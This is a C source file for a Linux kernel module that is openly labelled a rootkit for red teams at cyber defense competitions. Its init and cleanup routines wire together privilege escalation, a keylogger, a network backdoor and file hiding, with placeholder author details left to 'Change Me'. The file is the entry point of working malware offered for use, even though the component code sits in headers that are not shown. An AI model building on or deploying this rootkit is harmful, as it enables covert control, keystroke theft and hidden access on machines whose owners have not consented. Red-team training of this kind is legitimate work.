/*
 * Simple rootkit for use by red teams at cyber defense competitions
 * 
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/seq_file.h>
#include <linux/proc_fs.h>
#include "rootkit.h" 
#include "priv_escalate.h" 
#include "keylogger.h" 
#include "network_backdoor.h"
#include "file_hide.h"
#include "rootkit_strings.h"


int rootkit_init(void)
{   
    // Init rootkit string structures
    int_rootkit_strings();

	// Create rootkit proc directory
	if(!proc_mkdir(ROOT_PROC_DIR, NULL)){
        printk(KERN_ERR "Unable to create proc dir: %s \n", ROOT_PROC_DIR);
        return -ENOENT;
    }

    add_rootkit_fs_string(ROOT_PROC_DIR);

    init_priv_escalate_proc_file();    
    keylogger_init();
    int_network_backdoor();
    init_file_hide();
    return 0;
}

/* for proc files exit routines are not needed */
void rootkit_cleanup(void)
{	
    // Cleanup rootkit string structures
    cleanup_rootkit_strings();
	keylogger_exit();
    cleanup_network_backdoor();
    cleanup_file_hide();
    cleanup_priv_escalate_proc_file();
	remove_proc_entry(ROOT_PROC_DIR, NULL);
    
}

module_init(rootkit_init);
module_exit(rootkit_cleanup);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Change Me");
MODULE_DESCRIPTION("Change Me");
MODULE_VERSION("1.33.7");